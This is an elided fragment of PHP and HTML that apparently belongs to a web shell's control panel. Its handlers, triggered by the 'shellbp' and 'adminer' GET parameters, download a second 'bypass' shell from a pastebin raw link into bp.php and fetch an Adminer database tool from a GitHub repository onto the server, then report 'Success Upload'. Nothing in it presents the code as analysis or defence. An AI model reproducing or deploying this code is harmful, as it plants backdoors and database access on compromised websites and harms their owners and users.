...
<div class="kotak">
        ...
        <div class="infone">
           ...
           if (function_exists("mysql_connect")) {
              ...
              <input type='hidden' value='.$dir.'/'.$dir.' name='Adminer'>
              <input type='hidden' value='.$dir.' name='dirpath'>
              <input type='submit' value='Adminer' name='adminer' class='kont'></form></div>";
              echo"<div class='tol'>";
              echo" <form method='get'>
...
if (isset($_GET['shellbp'])) {
	...
	if(file_exists('bp.php')) {
		...
		if(adminer("https://pastebin.com/raw/ZeMS76aA","bp.php")) {
			echo "<center><font color=green>Success Upload</font></center>";
		} else {
...
if (isset($_GET['adminer'])) {
	...
	if(file_exists('adminer.php')) {
		...
		if(adminer("https://raw.githubusercontent.com/Jenderal92/shin/main/adminer-4.8.1.php","adminer.php")) {
			echo "<center><font color=green>Success Upload Adminer</font></center>";
		} else {
